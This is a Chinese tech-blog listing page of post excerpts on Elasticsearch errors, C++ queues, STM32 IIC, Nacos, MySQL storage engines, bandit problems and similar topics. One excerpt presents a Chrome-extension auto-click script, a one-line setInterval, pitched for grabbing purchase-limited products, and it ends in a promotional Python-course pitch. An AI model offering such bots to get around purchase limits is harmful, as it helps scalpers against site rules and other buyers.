			<a href="/posts/5daface9a48a9a4e60a4d42c9aae922f/" rel="bookmark">
			播放卡顿分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		看下这个M3U8请求，时间间隔超过duration的时长。ts的duration是11S
M3U8内容更新慢？
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ac35d7136552017e1037d7c4c919500/" rel="bookmark">
			es报错：request contains unrecognized parameter [ignore_throttled]
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 背景问题描述测试代码解决办法降低springboot版本降低es客户端版本 好文章： 背景 使用DeleteIndexRequest api删除过期数据。
问题描述 在使用 Springboot2.2.0 整合 ES集群5.4.0 的时候，使用 Springboot 时，使用的是 Springboot data 提供的工具，具体依赖如下：
&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-elasticsearch&lt;/artifactId&gt; &lt;/dependency&gt; 测试代码 在新建的 Springboot 项目中，添加上面的那个依赖后，配置 yml 文件如下：
spring: elasticsearch: rest: uris: "服务器地址" read-timeout: "10s" 在 SpringbootTest 中添加测试内容如下：
package cn.smileyan.demo; import java.io.IOException; import org.elasticsearch.action.admin.indices.create.CreateIndexRequest; import org.elasticsearch.action.admin.indices.create.CreateIndexResponse; import org.elasticsearch.action.admin.indices.delete.DeleteIndexRequest; import org.elasticsearch.client.RequestOptions; import org.elasticsearch.client.RestHighLevelClient; import org.junit.jupiter.api.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; /** * @author smileyan */ @SpringBootTest class ElasticsearchDemoApplicationTests { @Autowired private RestHighLevelClient client; @Test public void testCreate() throws IOException { CreateIndexRequest request = new CreateIndexRequest("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ac35d7136552017e1037d7c4c919500/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3be56673a547dcbded4cb889c6a37b94/" rel="bookmark">
			【数据结构】链式队列的基本操作（C&#43;&#43;）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、定义链式队列二、链式队列的基本操作1.初始化队列2.判断队列是否为空3.入队操作4.出队操作5.访问队列的队首元素6.计算队列的长度 所有源代码 前言 本文主要介绍数据结构中链式队列的基本操作
一、定义链式队列 typedef struct QueneNode { int data; struct QueneNode* next; }Node; typedef struct LinkQuene { Node* front; Node* rear; }LinkQuene; 二、链式队列的基本操作 1.初始化队列 //初始化队列 void Init_Quene(LinkQuene&amp; q) { Node *p; p = new Node; if (!p) { cout &lt;&lt; "分配内存失败" &lt;&lt; endl; return; } p-&gt;next = NULL; q.front = q.rear = p; } 2.判断队列是否为空 //判断队列是否为空 int is_Empty_Quene(LinkQuene q) { if (q.front == q.rear) { return 1; } return 0; } 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3be56673a547dcbded4cb889c6a37b94/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e2fb2b81c7186306630c07c558c38de/" rel="bookmark">
			vue-element-admin踩坑合集&#43;完整包（项目源码 &#43;依赖）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
Nodejs版本：
安装依赖时遇到的报错：
启动报错：
vue-element-admin完整包地址：
在部署安装使用vue-element-admin开源项目的时候，会遇到各种各样的问题。
这里是本人遇到的一些坑。。。。。。
Nodejs版本： 这里对nodejs版本要求很高，不能太高不能太低。一般这是问题的集合点！！！！
我使用的是16.14.2版本。（这里强烈推荐使用nvm安装nodejs，可以灵活更改版本使用）
#nvm下载地址 https://github.com/coreybutler/nvm-windows/releases #下载完成后直接安装 nvm install 16.14.2 nvm use 16.14.2 安装依赖时遇到的报错： 这里最容易遇到的报错就是在安装依赖的时候
不用怀疑，大部分类似下图问题都是因为网络问题：
网上大部分解决方法是：
使用以下命令，把地址里的ssh://git@ 换成 https://的目的，可以是可以但是问题也没那么大。
git config --global url."https://".insteadOf git:// 再安装依赖
npm install 不用怀疑，极大部分原因都是网络问题！！！这时可以使用国内淘宝的镜像源安装，或者开启vpn代理进行安装，就不会卡住报错了。建议开代理安装，会比较稳。
启动报错： INFO Starting development server... 10% building 2/5 modules 3 active ...ndex.js!D:\VSCode\Vue\vue-element-admin\node_modules\eslint-loader\index.js??ref--13-0!D:\VSCode\Vue\vue-element-admin\src\main.jsError: error:0308010C:digital envelope routines::unsupported at new Hash (node:internal/crypto/hash:71:19) at Object.createHash (node:crypto:140:10) at module.exports (D:\VSCode\Vue\vue-element-admin\node_modules\webpack\lib\util\createHash.js:135:53) at NormalModule._initBuildHash (D:\VSCode\Vue\vue-element-admin\node_modules\webpack\lib\NormalModule.js:417:16) at handleParseError (D:\VSCode\Vue\vue-element-admin\node_modules\webpack\lib\NormalModule.js:471:10) at D:\VSCode\Vue\vue-element-admin\node_modules\webpack\lib\NormalModule.js:503:5 at D:\VSCode\Vue\vue-element-admin\node_modules\webpack\lib\NormalModule.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2e2fb2b81c7186306630c07c558c38de/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cfe27c01230b1a2f5b5cedeac2c46dae/" rel="bookmark">
			IIC通讯(软件模拟&#43;硬件IIC)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		工程文件链接：
https://pan.baidu.com/s/1dG06HRmqJpc5HRWf3rO4hQ?pwd=6666 提取码：6666 由于C8T6有两个硬件IIC我把硬件IIC和软件IIC结合在一起了，只用修改两个宏定义就可以来回切换硬件IIC和软件模拟IIC ,其他基本不用动,目前里面的例子是MPU6050,大家可以自行修改
软件IIC模拟 我们假设用PB10和PB11作为IIC的SCL和SDA
注意SCL拉高读取数据，SCL拉低允许数据变化
注意SCL,SDA默认都是高电平
注意操作完某根线后记得放开对该线的操作权
GPIO配置 #define IIC_SCL(x)	MyI2C_W_SCL(x) #define IIC_SDA(x)	MyI2C_W_SDA(x) #define IIC_Read_SDA MyI2C_R_SDA() //读数据 /********************配置GPIO**************************************/ void MyI2C_W_SCL(uint8_t BitValue) { GPIO_WriteBit(GPIOB, GPIO_Pin_10, (BitAction)BitValue); Delay_us(10); } void MyI2C_W_SDA(uint8_t BitValue) { GPIO_WriteBit(GPIOB, GPIO_Pin_11, (BitAction)BitValue); Delay_us(10); } uint8_t MyI2C_R_SDA(void) { uint8_t BitValue; BitValue = GPIO_ReadInputDataBit(GPIOB, GPIO_Pin_11); Delay_us(10); return BitValue; } void MyI2C_Init(void) { RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOB, ENABLE); GPIO_InitTypeDef GPIO_InitStructure; GPIO_InitStructure.GPIO_Mode = GPIO_Mode_Out_OD; GPIO_InitStructure.GPIO_Pin = GPIO_Pin_10 | GPIO_Pin_11; GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz; GPIO_Init(GPIOB, &amp;GPIO_InitStructure); GPIO_SetBits(GPIOB, GPIO_Pin_10 | GPIO_Pin_11); } /********************配置GPIO结束**************************************/ IIC状态配置 之（呼叫IIC总线上的设备看看有没有反应） 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cfe27c01230b1a2f5b5cedeac2c46dae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ac010cffc4fb7273d71810571637ab7/" rel="bookmark">
			Nacos原理(注册中心和配置中心）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		服务注册中心本质上是为了解耦服务提供者和服务消费者。对于任何一个微服务，原则上都应存在或者支持多个提供者，这是由微服务的分布式属性决定的。更进一步，为了支持弹性扩缩容特性，一个微服务的提供者的数量和分布往往是动态变化的，也是无法预先确定的。因此，原本在单体应用阶段常用的静态LB机制就不再适用了，需要引入额外的组件来管理微服务提供者的注册与发现，而这个组件就是服务注册中心。
CAP理论
CAP理论是分布式架构中重要理论
一致性(Consistency) (所有节点在同一时间具有相同的数据)
可用性(Availability) (保证每个请求不管成功或者失败都有响应)
分隔容忍(Partition tolerance) (系统中任意信息的丢失或失败不会影响系统的继续运作)
1.什么是Nacos
Nacos 致力于帮助您发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。是Spring Cloud A 中的服务注册发现组件，类似于Consul、Eureka，同时它又提供了分布式配置中心的功能，这点和Consul的config类似，支持热加载。
Nacos 服务注册需要具备的能力： 服务提供者把自己的协议地址注册到Nacos server服务消费者需要从Nacos Server上去查询服务提供者的地址（根据服务名称）Nacos Server需要感知到服务提供者的上下线的变化服务消费者需要动态感知到Nacos Server端服务地址的变化 作为注册中心所需要的能力大多如此，我们需要做的是理解各种注册中心的独有特性，总结他们的共性。
Nacos的实现原理： 下面我们先来了解一下 Nacos 注册中心的实现原理，通过下面这张图来说明。
图中的流程是大家所熟悉的，不同的是在Nacos 中，服务注册时在服务端本地会通过轮询注册中心集群节点地址进行服务得注册，在注册中心上，即Nacos Server上采用了Map保存实例信息，当然配置了持久化的服务会被保存到数据库中，在服务的调用方，为了保证本地服务实例列表的动态感知，Nacos与其他注册中心不同的是，采用了 Pull/Push同时运作的方式。
2.Nacos原理
Nacos注册中心分为server与client，server采用Java编写，为client提供注册发现服务与配置服务。而client可以用多语言实现，client与微服务嵌套在一起，nacos提供sdk和openApi，如果没有sdk也可以根据openApi手动写服务注册与发现和配置拉取的逻辑
Nacos注册概括来说有6个步骤：
0、服务容器负责启动，加载，运行服务提供者。
1、服务提供者在启动时，向注册中心注册自己提供的服务。
2、服务消费者在启动时，向注册中心订阅自己所需的服务。
3、注册中心返回服务提供者地址列表给消费者，如果有变更，注册中心将基于长连接推送变更数据给消费者。
4、服务消费者，从提供者地址列表中，基于软负载均衡算法，选一台提供者进行调用，如果调用失败，再选另一台调用。
5、服务消费者和提供者，在内存中累计调用次数和调用时间，定时每分钟发送一次统计数据到监控中心。
Nacos 服务注册与订阅的完整流程
Nacos 客户端进行服务注册有两个部分组成，一个是将服务信息注册到服务端，另一个是像服务端发送心跳包，这两个操作都是通过 NamingProxy 和服务端进行数据交互的。
Nacos 客户端进行服务订阅时也有两部分组成，一个是不断从服务端查询可用服务实例的定时任务，另一个是不断从已变服务队列中取出服务并通知 EventListener 持有者的定时任务。
服务领域模型
Nacos的注册发现是一种三层模型: 即 服务--集群--实例
Nacos服务领域模型主要分为命名空间、集群、服务。在下图的分级存储模型可以看到，在服务级别，保存了健康检查开关、元数据、路由机制、保护阈值等设置，而集群保存了健康检查模式、元数据、同步机制等数据，实例保存了该实例的ip、端口、权重、健康检查状态、下线状态、元数据、响应时间。
3.注册中心原理
服务注册方法：以Java nacos client v1.0.1 为例子，服务注册的策略的是每5秒向nacos server发送一次心跳，心跳带上了服务名，服务ip，服务端口等信息。同时 nacos server也会向client 主动发起健康检查，支持tcp/http检查。如果15秒内无心跳且健康检查失败则认为实例不健康，如果30秒内健康检查失败则剔除实例。
4.配置中心原理
5.Nacos 的关键特性包括:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ac010cffc4fb7273d71810571637ab7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9368abc1a3a3274d99e3405a29429add/" rel="bookmark">
			viewPager &#43; ConstraintLayout 自适应高度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在 ConstraintLayout （约束布局）中，我们发现viewPager除了设置固定的尺寸外，要不就是全屏，这很不符合我们的需求，改造下：
layout中：
&lt;MyViewPager android:id="@+id/viewPager" android:layout_width="0dp" android:layout_height="wrap_content" android:background="@color/yellow" app:layout_constraintEnd_toEndOf="parent" app:layout_constraintStart_toStartOf="parent" app:layout_constraintTop_toBottomOf="@+id/tab_layout"/&gt; item 布局：
&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="wrap_content"&gt; &lt;ImageView android:id="@+id/soon_stop_icon" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginStart="28dp" android:layout_marginTop="28dp" app:layout_constraintStart_toStartOf="parent" app:layout_constraintTop_toTopOf="parent" /&gt; &lt;/androidx.constraintlayout.widget.ConstraintLayout&gt; 改造代码：
import android.content.Context; import android.util.AttributeSet; import android.view.View; import androidx.annotation.NonNull; import androidx.annotation.Nullable; import androidx.viewpager.widget.ViewPager; /** * mwt,自适应高 */ public class MyViewPager extends ViewPager { public MyViewPager(@NonNull Context context) { this(context, null); } public MyViewPager(@NonNull Context context, @Nullable AttributeSet attrs) { super(context, attrs); } @Override protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) { int height = 0; for (int i = 0; i &lt; getChildCount(); i++) { View child = getChildAt(i); child.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9368abc1a3a3274d99e3405a29429add/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05b2e71275537ab8c63aab440c261b40/" rel="bookmark">
			简易的自动抢购脚本，适用于各种限购产品，你懂得！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		两年前的中秋节，阿里巴巴四个程序员编写了段网页脚本，抢了公司一百多盒月饼而惨遭辞退。有人说阿里小题大做，有人说诚信第一，那时我在想他们是如何做到的呢？上个月，二组群里讨论Python编程，我忽然想起了抢月饼事件。问了一圈群里没人做过，：想做就去学，一定可以学会的。一拖再拖，这周终于开启了学习。
搜索发现网络上已经有不少解决方法，但思路基本一致：利用浏览器插件实现代码注入。浏览器编程语言为JavaScript（JS），与我熟悉的C语言相差挺大，在Kindle下载了三本相关的书，快速了解了JS的基本规则。按照网络教程，学会了谷歌（Chrome）浏览器简单扩展程序的开发。这样就掌握了编写自动抢购脚本的最少必要知识。然后，最好的办法就是行动起来，去做，去犯错吧。
我这次要写的这个脚本其实很简单，就是让程序自动点击抢购页面上的按钮，开发步骤如下。
1.设置一个抢购页面
第一步是做一个抢购页面，供脚本使用。代码如下图所示，将其保存为html文件。
抢购页面html代码
页面显示十分简陋，最重要的是设置的“点我抢购”按钮。
正常情况下，用户通过点击按钮参与到购买活动，拼的是手速。很多时候，我们并不知道也许自己竞争的对手是机器。利用脚本在满足条件的一瞬间（到预定时间等）迅速出击，制造出秒杀、秒光的场景。
2.写一个自动触发程序
开发一个简单的谷歌浏览器扩展程序，配置如下图所示，将其保存为manifest.json文件。
谷歌浏览器扩展程序配置
最核心的部分是编写与其配套的JS文件，但代码十分简单：
setInterval(function(){document.getElementById(“rush”).click()}, 1000)
作用是开启一个定时1秒的定时器，在定时到的时候就点击网页上Id为"rush"的按钮，也就是1秒自动点一次抢购按钮。在准备好这两个文件后，打开Chrome，在菜单栏找到扩展程序选项，点击进入扩展程序管理界面，选择存放这两个文件的文件夹，即可添加刚开发的扩展程序。
打开html文件，不做任何操作，浏览器就会弹出抢购成功的提示，也就是脚本已经顺利运转，帮我自动完成了抢购。
抢购成功了
3.场景扩展
为了测试这个脚本对真实网页的效果，随便打开了浏览器收藏夹中的一个网址，瞄准了该页面上的“搜索”按钮，目标是通过脚本自动实现对该按钮的点击。通过查看网页源代码找到了该按钮的Id，修改相应的脚本代码。重新添加扩展程序，刷新网页，预想的情况发生了，“搜索”按钮被点击，打开了一个搜索页面。意想不到的事情也发生了，自动打开的页面越来越多，甚至来不及关闭原网页，不得已只得关闭整个浏览器。
这个脚本初步实现了自动抢购的功能，为了能够满足实际应用，还需要根据具体情况进行改进，比如监测到按钮的状态从不可用到可用时发起点击，或者在预定时间点发起点击，或者自动填写网页的表格等。
说实话，这个小脚本对于互联网开发者根本不值一提，但对于只与盒子打交道的嵌入式程序员来说，却仿佛看到了代码世界的另一个维度。区块链开发者嘲笑互联网开发者为古典程序员，这么说我肯定算是一个远古程序员了。远古不可怕，但如果不懂进化，或许想离灭亡就不久远了。
关于Python技术储备 学好 Python 不论是就业还是做副业赚钱都不错，但要学会 Python 还是要有一个学习规划。最后大家分享一份全套的 Python 学习资料，给那些想学习 Python 的小伙伴们一点帮助！
朋友们如果需要可以微信扫描下方CSDN官方认证二维码免费领取【保证100%免费】
一、Python学习大纲 Python所有方向的技术点做的整理，形成各个领域的知识点汇总，它的用处就在于，你可以按照上面的知识点去找对应的学习资源，保证自己学得较为全面。
Python实战案例 光学理论是没用的，要学会跟着一起敲，要动手实操，才能将自己的所学运用到实际当中去，这时候可以搞点实战案例来学习。
python副业兼职与全职路线 👉[[CSDN大礼包：《python兼职资源&amp;全套学习资料》免费分享]]（安全链接，放心点击）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c518f3d36f535e5255249643447a35e3/" rel="bookmark">
			简易版Web服务器实现(前端&#43;后端)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本人开发的简易版Web服务器，服务器主要实现功能，针对终端模块的登记锁车控制，Cet工具的发布和版本迭代，数据的上传等。
前端采用HTML+Javascript+CSS+JQuery实现
后端采用QT(QTcpServer)实现自定义HTTP服务器+Windows配置的HTTP服务器+Nginx(做反向代理)实现https的访问
Nginx的配置如下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b53c119d68bbac1d80ba8d24039465c/" rel="bookmark">
			从零开始强化学习一：Bandit Problem
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一：强化学习概述 强化学习是一种机器学习方法，旨在让智能体在与环境交互的过程中学会制定最优策略，以达到最大化累积奖励的目标。
在强化学习中，智能体需要学会从环境中感知状态，做出动作，并通过环境返回的奖励信号来更新自己的策略。通常情况下，智能体需要通过不断地尝试和反馈来优化策略，直到最终达到最优策略。
强化学习的关键概念包括：
智能体（Agent）：类似动作执行者，游戏玩
环境（Environment）：智能体在任意时刻所处的环境。
动作（Action）：智能体在某个状态下采取的行动。
报酬（Reward）：智能体在采取某个动作后，从环境中获得的奖励信号。
Q值函数(q(A)=E(R|A))：描述了在某个状态下采取某个动作后所能获得的累积奖励期望值。
强化学习算法包括：Q学习、SARSA、Actor-Critic、深度Q网络（DQN）等等。这些算法都采用了不同的方法来实现智能体的决策过程，并通过不断地学习和优化来实现最优策略的选择。强化学习在许多领域有着广泛的应用，例如自动驾驶、机器人控制、游戏AI等。
废话不多说，下面开始实战：
二：Bandit Problem（赌博机问题） Bandit Problem（赌博机问题）是强化学习中的一个经典问题，它是指一个智能体需要在多个赌博机中选择一个赌博机进行游戏，每个赌博机有不同的奖励概率分布，智能体需要通过不断地尝试不同的赌博机，从而获得最大的累计奖励。
在 Bandit Problem 中，每个赌博机可以看作是一个“臂”，智能体可以通过拉动臂来尝试不同的赌博机。每次拉动一个赌博机，智能体会得到该赌博机对应的奖励，奖励通常是一个随机变量，其概率分布通常是未知的。因此，智能体需要通过不断地尝试不同的赌博机，来估计每个赌博机的奖励概率分布，并选择那些估计奖励最高的赌博机。
Bandit Problem 可以有多种变体，包括 k-臂赌博机问题、非定态赌博机问题、上下文赌博机问题等。这些变体中，上下文赌博机问题是一种比较常见的形式，它引入了关于赌博机的额外信息，例如赌博机的特征向量、当前状态等，从而使得智能体能够更准确地估计每个赌博机的奖励概率分布，进而做出更好的选择。
下面以Bandit Problem原理入门强化学习
现在有数量不知的赌博机，每个赌博机有不同的特性（即猜中和不猜中），假设玩家现在决定玩赌博机1000次，最初的情况是玩家不知道每个赌博机的能否猜中的情况，而是要先玩了之后，根据结果去推断赌博机是否是好的赌博机（即中奖多的）。
那么什么是好的赌博机呢？
假设现在有两个赌博机a,b,能得到硬币枚数和对应该率如下表：
slot machine a能得到硬币枚数01510概率0.70.150.120.03slot machine b能得到硬币枚数01510概率0.50.40.090.01 那么我们可以很容易联想到用期望去衡量：
a:E(a) = 0*0.7+1*0.15+5*0.12+10*0.03=1.05
b:E(b) = 0*0.50+1*0.4+5*0.09+10*0.01=0.95
期望代表平均，那么玩1000次，要收获硬币最多，自然选择slot machine a啦。
以上面例子来说：
报酬（Reward）可以说是能得到硬币枚数，R={0，1，5，10}；Agent是玩家；Action是玩家能采取的行动，也就是选slot machine a或者slot machine b，即变量是A = {a,b}；那么选择A后得到报酬的E(R|A)，也就是我们说的行动价值Q(A)=E(R|A)
三：赌博机算法 假设赌博机a,b实验三回后能得到的枚数如下：
slot machine结果第1回第2回第3回a015b100 Q（a）=（0+1+5）/3=2，Q（b）=(1+0+0)/3=0.33
实验n回 ，
代码：
import numpy as np # naive implementation np.random.seed(0) rewards = [] for n in range(1, 11): reward = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4b53c119d68bbac1d80ba8d24039465c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/22c9c7c0a2a6552b00785c03ed57964d/" rel="bookmark">
			洛谷P8597 [蓝桥杯 2013 省 B] 翻硬币C语言/C&#43;&#43;
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		[蓝桥杯 2013 省 B] 翻硬币 题目背景 小明正在玩一个“翻硬币”的游戏。
题目描述 桌上放着排成一排的若干硬币。我们用 * 表示正面，用 o 表示反面（是小写字母，不是零），比如可能情形是 **oo***oooo，如果同时翻转左边的两个硬币，则变为 oooo***oooo。现在小明的问题是：如果已知了初始状态和要达到的目标状态，每次只能同时翻转相邻的两个硬币，那么对特定的局面，最少要翻动多少次呢？
输入格式 两行等长字符串，分别表示初始状态和要达到的目标状态，每行长度小于 1000 1000 1000。
数据保证一定存在至少一种方案可以从初始状态和要达到的目标状态。
输出格式 一个整数，表示最小操作步数。
样例 #1 样例输入 #1 ********** o****o**** 样例输出 #1 5 样例 #2 样例输入 #2 *o**o***o*** *o***o**o*** 样例输出 #2 1 提示 source：蓝桥杯 2013 省 B 组 H 题
所需变量
int arr[2][1005];//用于存储初始状态和终止状态硬币的状况
int sum = 0;//用于记录翻转次数
int i;//循环变量
int control = 0;//用于记录这个字符串的长度
思路：我们首先仔细分析不难发现，就是遍历，如果遇到两个不一样的我们就开始翻转，顺带着后面一个也跟着翻转，直至到结束都翻转过来！
首先是将字符串读入，我的做法是一个一个字符的读取，读入代码如下：
for(i = 0;i&lt;2;i++){ control = 0; while(~scanf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/22c9c7c0a2a6552b00785c03ed57964d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c6d81986ce286694addac9c83c44f45/" rel="bookmark">
			【MySQL系列】- 常用MySQL存储引擎
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【MySQL系列】- 常用MySQL存储引擎 数据库存储引擎是数据库底层软件组织，数据库管理系统使用数据引擎进行创建、查询、更新和删除数据。不同的存储引擎提供不同的存储机制、索引机制、锁定水平等功能。不同的存储引擎，都有其特定的功能及特定应用场景。
MySQL常用存储引擎有一下几类：
1、InnoDB存储引擎 InnoDB是事务性数据库首选引擎，InnoDB从Mysql5.5.5开始就成为数据默认的存储引擎，是MySQL8.0之后最重要，使用最广泛的存储引擎。支持事务安全（ACID），支持行锁定和外键。
InnoDB主要特性： InnoDB支持事务：事务是数据库操作的基本单位，它是一组数据库操作的集合，要全部执行成功，要么全部不执行。InnoDB存储引擎支持ACID事务，保证了数据库的可靠性和一致性。
在MySQL中，使用START TRANSCTION语句开启一个事务，使用COMMOT语句提交事务，使用ROLLBACK语句回滚事务。
执行行级锁：行级锁是一种并发控制机制，它可以在不同事务之间实现数据的隔离性和一致性。InnoDB存储引擎支持行级锁，能够提高并发性能和可扩展性。
在MySQL中，可以使用SELECT … FOR UPDATE语句来获取行级锁，保证在更新操作时，其他事务不能修改行数据。
支持MVCC：MVCC是一种多版本并发控制机制，它可以在不同事务之间实现数据的隔离性和一致性。InnoDB存储引擎支持MVCC，能够保证不同事务之间的隔离性和一致性。
在MySQL中，可以使用READ COMMITTEND隔离级别来支持MVCC机制。在READ COMMITTED隔离级别下，每个事务只能看到已提交的数据版本，不能看到其他事务未提交的数据版本。
支持外键：在MySQL中，可以使用FOREIGN KEY约束来支持外键约束。在创建表时，可以使用FOREIGN KEY语句定义外键约束，确保在进行数据操作时，关联表之间的数据一致性。
支持自动增长列：在MySQL中，可以使用AUTO_INCREMENT关键字定义自动增长列。在使用InnoDB存储引擎时，自动增长列实现方式时在表中创建一个名为AUTO_INCREMENT的隐藏列，该列用于存储下一个自动增长的值。
支持崩溃恢复：InnoDB存储引擎支持崩溃恢复，能够保证数据库在崩溃后可以快速恢复到正常状态。当数据库发生崩溃时，InnoDB存储引擎会自动启动崩溃恢复过程，将未完成的事务进行回滚或者重做，从而保证数据的一致性。
2、MyISAM存储引擎 MyISAM基于ISAM存储引擎，并对其进行扩展。在 Web,数据仓储和其他应用环境使用的存储引擎较多。MyISAM拥有较高的插入、查询速度，但不支持事务和外键。
MyISAM主要特性： 不支持事务；表级锁定：在MySQL中，MyISAM存储引擎中，当发生数据更新时，会锁定整个表，以防止其他会话对该表中数据的同时修改所致的混乱。这样做可以使得操作简单，但是会减少并发量。读写相互阻塞：在MyISAM类型表中，即不可以在向数据表中写入数据的同时另一个会话也向该表写入数据，也不允许其他的会话读取该表中的数据。只允许多个会话同时读取该数据表中的数据。只会缓存索引，不会缓存数据：缓存，是指数据库在访问磁盘数据时，将更多的数据读取进入内存，这样可以使得当访问这些数据时，直接从内存中读取而不是再次访问硬盘。MyISAM可以通过key_buffer_size缓存索引，以减少磁盘I/O,提升访问性能。MyISAM数据表并不会缓存数据。读取速度较快，占用资源较少；不支持外键约束；支持全文索引； MyISAM适用场景： 不需要事务支持的场景；读取操作比较多，写入操作较少；数据并发较低的场景；硬件条件比较差的场景；在配置数据库读写分离场景下，从库可以使用MyISAM索引； 3、Memory存储引擎 MySQL中Memory存储引擎是一个置于内存中的表，其采用的存储介质是内存。响应速度很快。但是当MySQL守护进程崩溃的时候数据会丢失。Memory存储引擎是存储的数据类型是长度不变的类型，blob/text类的数据类型不可用。
Memory存储引擎特性： 存储瞬时非关键数据；
内存存储，可实现快速访问和低延迟。
只读或读取是主要数据访问模式：每个基于MEMORY存储引擎的表实际对应一个磁盘文件。该文件的文件名与表名相同，类型为frm类型。该文件中只存储表的结构。而其数据文件，都是存储在内存中，这样有利于数据的快速处理，提高整个表的效率。值得注意的是，服务器需要有足够的内存来维持MEMORY存储引擎的表的使用。如果不需要了，可以释放内存，甚至删除不需要的表。
支持数据类型有限：不支持Text和Blob数据类型，对于字符串类型的数据，只支持固定长度的行，VARCHAR会被自动存储为CHAR类型。
支持表级锁：在访问量比较大时，表级锁会成为MEMORY存储引擎的瓶颈。
查询中存在临时表且表中有BLOB、TEXT类型的字段，那么在这个临时表会自动转化为MyISAM类型的表。性能会急剧降低。
默认索引使用Hash索引。
内存表特别大时，自动转换为MyISAM类型实体表。
4、CSV存储引擎 CSV存储引擎是以CSV文件的方式存储数据。CSV是MySQL中相对比较简单并方便的存储引擎。它简单是因为其创建和使用简单。存储文件是CSV文件，可以直接对CSV文件进行修改。CSV存储引擎只有在MySQL5.0版本之后才支持。
CSV存储引擎特性： 数据以文本方式存储：.CSV文件存储表内容，CSM文件存储表的元数据如表状态和数据量，.frm文件存储表结构信息。列不能为NULL；不支持索引；可对数据文件进行直接编辑； CSV存储引擎的特性，决定CSV非常适合在数据库中担任中间交换表的角色。如对数据进行导入运维时，可以使用EXCEL转为CSV中直接复制覆盖表，并通过SQL语句对数据进行操作。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0d2d8b3f21ac77bf779f57b2d10c747/" rel="bookmark">
			电脑桌面一刷新图标就空出来一个
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我的电脑系统是win10的也出现了这个问题，经过多次查找问题发现是因为：无意间勾选了“将图标与网格对齐”项所导致的。
解决方法：
去掉“将图标与网格对齐”的勾选。将“自动排列图标”勾选上。 两种方法都可以，我想win11应该也一样吧
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/72df249955fda515e239936fa98ace75/" rel="bookmark">
			处理外包大赛比赛数据记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、需求二、爬取阶段1.使用requests进行请求获取网页内容2.使用selenium模拟人操作浏览器获取网页内容(1)环境配置(2) 源码 3.使用phantomjs模拟人操作浏览器获取网页内容4.使用phantomjs模拟人操作浏览器获取网页截图 浅浅记录一下自己在做一个比赛数据处理过程中的遇到的一些问题。 一、需求 首先数据的格式是长下面图片这样的，左边是网站链接，右边是网站分类的标签，然后我要做的工作就是访问每个网站将网站的文本爬取下放在每个链接后边。
二、爬取阶段 下面就是我的尝试过程了😂
